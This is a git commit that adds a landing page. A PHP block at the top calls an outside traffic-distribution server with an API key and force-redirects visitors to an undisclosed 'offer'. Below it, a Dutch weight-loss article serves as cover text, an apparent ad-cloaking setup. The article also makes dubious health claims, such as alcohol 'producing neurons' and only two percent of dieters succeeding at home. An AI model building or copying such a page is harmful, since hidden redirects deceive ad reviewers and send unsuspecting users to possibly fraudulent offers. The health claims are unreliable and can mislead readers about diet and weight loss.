136b1a167d91c476ebd899e70cfb11654306dbb5
kash2413 <kash2413@gmail.com>
2021-03-28 02:27:56 +0400

    1

---
+++ index.php
@@ -0,0 +1,83 @@
+<?php
+// Query params are: utm_creative={{ad.name}}&utm_campaign={{campaign.name}}&utm_source={{site_source_name}}&utm_placement={{placement}}&campaign_id={{campaign.id}}&adset_id={{adset.id}}&ad_id={{ad.id}}&adset_name={{adset.name}} 
+
+require_once dirname(__FILE__) . '/kclient.php';
+$client = new KClient('https://beruaidlas.tk/api.php?', 'HRsJHB9HbGHmRTzY');
+$client->sendAllParams();       // to send all params from page query
+$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
+// $client->param('sub_id_5', '123'); // you can send any params
+// $client->keyword('PASTE_KEYWORD');  // send custom keyword
+// $client->currentPageAsReferrer(); // to send current page URL as click referrer
+// $client->debug();              // to enable debug mode and show the errors
+// $client->execute();             // request to api, show the output and continue
+$client->executeAndBreak();     // to stop page execution if there is redirect or some output
+?>
+
+<!DOCTYPE html>
+<html  >
+<head>
+  <!-- Site made with Mobirise Website Builder v5.2.0, https://mobirise.com -->
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Mobirise v5.2.0, mobirise.com">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+  <link rel="shortcut icon" href="assets/images/logo5.png" type="image/x-icon">
+  <meta name="description" content="">
+  
+  
+  <title>Home</title>
+  <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2.css">
+  <link rel="stylesheet" href="assets/tether/tether.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
+  <link rel="stylesheet" href="assets/theme/css/style.css">
+  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
+  
+  
+  
+  
+</head>
+<body>
+  
+  <section class="features11 cid-sp4CMewKK9" id="features12-0">
+
+    
+    
+    <div class="container">
+        <div class="row align-items-center">
+            <div class="col-12 col-lg">
+                <div class="card-wrapper">
+                    <div class="card-box">
+                        <h4 class="card-title mbr-fonts-style mb-4 display-2"><strong>De basis van een goed dieet om af te vallen</strong></h4>
+                        <p class="mbr-text mbr-fonts-style mb-4 display-7">Een goede voeding is gebaseerd op de volgende principes:<br><br>Dieetvariatie. Om af te vallen hoef je niet alleen kefir en komkommer te eten! Het menu moet lekker, gezond en gevarieerd zijn.<br>Fractionele voeding. De dagelijkse calorie-inname moet worden verdeeld over drie hoofdmaaltijden en twee tussendoortjes. Ontbijt - 30%, lunch - 35%, diner - 25%, twee snacks - 10%. Dus het lichaam zal geen honger hebben.<br>Het grootste deel van het menu moet biologisch zijn, zonder kunstmatige toevoegingen, suiker of zoetstoffen.<br>In dit geval moet het dieet voldoen aan de normen voor calorieën, eiwitten, vetten en koolhydraten.</p>
+                        
+                        
+                    </div>
+                </div>
+            </div>
+            <div class="col-12 col-lg-7 md-pb">
+                <div class="image-wrapper">
+                    <img src="assets/images/mbr-6.jpg" alt="Mobirise">
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="content5 cid-sp4CQcYTHw" id="content5-1">
+    
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-md-12 col-lg-10">
+                <h3 class="mbr-section-title mbr-fonts-style mb-4 display-2"><strong>Waar moet ik beginnen?</strong></h3>
+                
+                <p class="mbr-text mbr-fonts-style display-7">Overschakelen naar een nieuw type dieet bestaat uit vijf stappen:<br><br>Elimineer voedingsmiddelen die niet gunstig zijn voor het lichaam en die zogenaamde "lege calorieën" bevatten. Dit zijn gebakken goederen, gebak, snoep, worstjes en halffabrikaten, mayonaise, sauzen.<br>Stop met alcohol. Sommige onderzoeken tonen aan dat deze dranken de eetlust beïnvloeden doordat ze neuronen in de hersenen produceren. Hoe meer iemand drinkt, hoe meer hij zal eten.<br>Houd uw waterbalans in de gaten. Drink elke dag minstens 1,5 liter schoon water. De geschatte snelheid wordt berekend met behulp van de formule: 30 milliliter per kilogram gewicht.<br>Op dieet. Zoals hierboven vermeld, moet u uw dagelijkse calorie-inname opsplitsen over meerdere maaltijden. Bepaal voor iedereen de meest geschikte tijd en houd je eraan. Het schema moet voor elke dag hetzelfde zijn.<br>Krijg kracht en geduld. Overstappen naar een nieuwe levensstijl kan moeilijk zijn.<br>In feite is het proces van het veranderen van gewoonten buitengewoon moeilijk. Conventionele counseling helpt niet. Je moet de beoordelingen van mensen die afvallen door magische diëten op internet niet lezen. In feite kan slechts twee procent van de mensen thuis afvallen zonder hun gezondheid te schaden. In alle andere gevallen is gekwalificeerde ondersteuning van specialisten op het gebied van gewichtsverlies vereist. Dit zijn voedingsdeskundigen, psychologen en persoonlijke adviseurs.</p>
+            </div>
+        </div>
+    </div>
+</section><section style="background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif; color:#aaa; font-size:12px; padding: 0; align-items: center; display: flex;"><a href="https://mobirise.site/f" style="flex: 1 1; height: 3rem; padding-left: 1rem;"></a><p style="flex: 0 0 auto; margin:0; padding-right:1rem;">How to design a site - <a href="https://mobirise.site/x" style="color:#aaa;">Go here</a></p></section><script src="assets/web/assets/jquery/jquery.min.js"></script>  <script src="assets/popper/popper.min.js"></script>  <script src="assets/tether/tether.min.js"></script>  <script src="assets/bootstrap/js/bootstrap.min.js"></script>  <script src="assets/smoothscroll/smooth-scroll.js"></script>  <script src="assets/theme/js/script.js"></script>  
+  
+  
+</body>
+</html>
